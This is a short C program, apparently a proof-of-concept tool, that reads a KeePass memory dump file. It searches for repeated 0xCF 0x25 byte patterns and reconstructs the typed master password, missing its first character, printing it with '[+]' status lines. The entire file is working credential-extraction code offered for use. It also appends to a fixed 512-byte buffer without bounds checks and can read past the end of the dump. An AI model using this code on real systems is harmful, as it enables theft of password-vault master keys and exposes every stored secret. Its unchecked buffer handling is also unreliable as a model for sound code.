#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define ERROR(msg) do { \
    perror(msg); \
    return(1); \
} while (0)

void parse_and_print_pwd(unsigned char* mem_dump, size_t mem_dump_size);
int read_mem_dump_from_file(const char *filename, unsigned char **mem_dump, size_t *mem_dump_size);

int main(int argc, char *argv[]) {
    const char *dump_file = "KeePassDumpFull.dmp";
    unsigned char *mem_dump = NULL;
    size_t mem_dump_size = 0;

    if (read_mem_dump_from_file(dump_file, &mem_dump, &mem_dump_size) < 0) {
        fprintf(stderr, "Error reading memory dump from file\n");
        return 1;
    }

    printf("[+] Memory dump read successfully\n");

    parse_and_print_pwd(mem_dump, mem_dump_size);
    free(mem_dump);

    return 0;
}

void parse_and_print_pwd(unsigned char* mem_dump, size_t mem_dump_size) {
    int current_str_len = 0;
    char debug_str[512] = "";
    
    for (int j = 0; j < mem_dump_size - 1; j++) {
        if (mem_dump[j] == 0xcf && mem_dump[j + 1] == 0x25) {
            int cf25_count = 0;
            
            for (int k = 0; k < current_str_len; k++) {
                if (mem_dump[j + 2 + k * 2] == 0xcf 
                    && mem_dump[j + 2 + k * 2 + 1] == 0x25) {
                    cf25_count++;
                } else {
                    break;
                }
            }

            if (cf25_count == current_str_len) {
                char letter[3] = "";
                letter[0] = mem_dump[j + current_str_len * 2 + 2];
                letter[1] = '\0';
                if (isprint(letter[0]) && mem_dump[j + current_str_len * 2 + 4] == 0) {
                    strcat(debug_str, letter);
                    current_str_len++;
                }
            }
        }
    }
    printf("[+] manages to extract (first typed letter is missing): \n%s\n", debug_str);
}

int read_mem_dump_from_file(const char *filename, unsigned char **mem_dump, size_t *mem_dump_size) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Error opening file");
        return -1;
    }

    // Seek to the end of the file to find its size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);  // Reset file pointer to start

    *mem_dump = malloc(file_size);
    if (!*mem_dump) {
        perror("Memory allocation failed");
        fclose(file);
        return -1;
    }

    // Read the entire file into memory
    size_t read = fread(*mem_dump, 1, file_size, file);
    fclose(file);

    if (read != file_size) {
        fprintf(stderr, "Error reading file\n");
        free(*mem_dump);
        return -1;
    }

    *mem_dump_size = file_size;
    return 0;
}
